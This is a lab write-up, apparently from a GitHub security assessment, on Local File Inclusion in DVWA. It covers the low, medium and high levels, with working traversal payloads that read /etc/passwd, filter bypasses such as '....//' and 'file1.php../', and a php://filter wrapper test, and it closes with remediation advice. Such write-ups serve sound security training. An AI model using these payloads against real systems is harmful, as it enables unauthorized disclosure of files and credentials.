# File Inclusion (Local File Inclusion - LFI)

## Overview

File Inclusion is a vulnerability that allows attackers to include unintended files through user-controlled input. This may lead to disclosure of sensitive files or Remote Code Execution (RCE) when combined with other vulnerabilities.

> **Note:** Remote File Inclusion (RFI) was not tested because `allow_url_include` was disabled in the PHP configuration.


## Security Level Comparison

| Feature | Low | Medium | High |
|---------|------|---------|------|
| Protection | None | Basic directory traversal filtering | Whitelist using `fnmatch()` |
| Successful Bypass | Directory Traversal | Filter Bypass (`....//`) | Wildcard (`file*`) Bypass |


## Low Security Level

### Attack Flow

| Payload | Objective | Result |
|---------|-----------|--------|
| `?page=file1.php` | Verify normal functionality | File loaded successfully. |
| `?page=../../../../../../etc/passwd` | Read sensitive system file | ✅ `/etc/passwd` disclosed. |
| `?page=../../../../../../etc/hosts` | Read another system file | ✅ File disclosed. |

### Observation

The application does not validate the file path before including it. As a result, any local file can be accessed using directory traversal.

### Evidence

<p align="center">
<img src="https://github.com/Tanya0xCyber/Web-Application-Security-Assessment-DVWA/blob/main/Screenshots/File_inclusion/01_low_result.png" width="100%">
</p>

---

## Medium Security Level

### Attack Flow

| Payload | Objective | Result |
|---------|-----------|--------|
| `?page=../../../../../../etc/passwd` | Test previous payload | ❌ Blocked |
| `?page=....//....//....//....//....//....//etc/passwd` | Bypass traversal filter | ✅ `/etc/passwd` disclosed. |
| `?page=php://filter/read=convert.base64-encode/resource=file1.php` | Test PHP stream wrapper | *(Test if supported in your environment.)* |

### Observation

The application blocks basic directory traversal patterns, but the filter can be bypassed using an alternative traversal sequence (`....//`).

### Evidence

<p align="center">
<img src="https://github.com/Tanya0xCyber/Web-Application-Security-Assessment-DVWA/blob/main/Screenshots/File_inclusion/02_medium_result.png" width="100%">
</p>

---

## High Security Level

### Attack Flow

| Payload | Objective | Result |
|---------|-----------|--------|
| `?page=../../../../../../etc/passwd` | Test previous payload | ❌ Blocked |
| `?page=file../../../../../../etc/passwd` | Test wildcard bypass | ❌ Blocked |
| `?page=file/../../../../../../etc/passwd` | Test alternate traversal | ❌ Blocked |
| `?page=file1.php../../../../../../etc/passwd` | Bypass `fnmatch("file*")` validation | ✅ `/etc/passwd` disclosed. |

### Observation

The application checks whether the filename starts with `file`, but it does not validate the complete path. This allows the whitelist to be bypassed using `file1.php` followed by directory traversal.

### Evidence

<p align="center">
<img src="https://github.com/Tanya0xCyber/Web-Application-Security-Assessment-DVWA/blob/main/Screenshots/File_inclusion/03_high_result.png" width="100%">
</p>

---

## Root Cause

The application includes files using user-controlled input and relies on weak validation, allowing attackers to bypass restrictions and include unintended files.

## Overall Impact

- Read sensitive server files.
- Disclose application source code and configuration files.
- Leak credentials or system information.
- Achieve Remote Code Execution (RCE) when combined with another vulnerability (e.g., File Upload).

## Remediation

- Avoid including files directly from user input.
- Use a strict allowlist of permitted files.
- Validate canonical file paths before inclusion.
- Disable unnecessary PHP stream wrappers.
- Restrict file access using least-privilege permissions.
